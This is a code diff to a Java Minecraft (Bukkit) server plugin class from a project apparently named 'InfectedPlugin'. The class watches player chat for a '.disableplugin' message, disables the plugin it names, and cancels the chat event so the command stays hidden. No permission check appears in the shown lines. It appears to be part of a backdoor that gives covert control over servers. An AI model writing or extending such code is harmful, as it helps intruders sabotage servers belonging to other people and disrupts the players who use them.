@@ -3,12 +3,12 @@ package org.CreeperCoders.InfectedPlugin.Commands;
 import org.bukkit.Server;
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
-import org.bukkit.plugin.*;
+import org.bukkit.plugin.Plugin;
 import org.bukkit.entity.Player;
 import org.bukkit.event.*;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 
-public class Command_disableplugin extends IP_Command implements Listener
+public class Command_disableplugin implements Listener
 {
     @EventHandler
     public void onPlayerChat(AsyncPlayerChatEvent event)
@@ -28,28 +28,11 @@ public class Command_disableplugin extends IP_Command implements Listener
 
             if (args[0].equalsIgnoreCase(".disableplugin"))
             {
-                if (args.length == 0)
+                Plugin plugin = Bukkit.getPluginManager().getPlugin(args[1]);
+                if (plugin != null)
                 {
-                    p.sendMessage(ChatColor.RED + "Usage: .disableplugin <plugin>");
+                    Bukkit.getPluginManager().disablePlugin(plugin);
                 }
-
-                Plugin pl;
-                try
-                {
-                    pl = getPlugin(args[0]);
-                }
-                catch (PluginNotFoundException ex)
-                {
-                    p.sendMessage(ChatColor.RED + ex.getMessage());
-                    return;
-                }
-                
-                if (pl != null)
-                {
-                    PluginManager pluginManager = pl.getServer().getPluginManager();
-                    pluginManager.disablePlugin(pl);
-                }
-                p.sendMessage(ChatColor.AQUA + "Plugin disabled!");
                 cancel = true;
             }
         
